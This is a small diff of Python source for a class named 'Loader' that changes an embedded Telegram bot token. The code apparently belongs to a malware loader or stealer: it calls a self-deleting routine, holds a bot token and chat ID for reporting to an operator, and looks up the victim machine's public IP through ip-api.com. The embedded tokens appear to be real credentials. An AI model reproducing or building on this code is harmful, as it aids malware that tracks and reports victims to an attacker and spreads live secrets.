@@ -18,7 +18,7 @@ class Loader():
 	def __init__(self):
 		self.Kill_Self()
 		self.progrm = sys.argv[1]
-		self.token = "1867535261:AAG_wC07CxlM4ga5UfcA2eE_Jxxm9efPcG8"
+		self.token = "1761596488:AAG_BdDHTLiX5n40BT5R969inOpRGkYV6fs"
 		self.chat_id = "1742761281"
 		data = json.loads(self.Request("http://ip-api.com/json/"))
 		self.ip = data["query"]
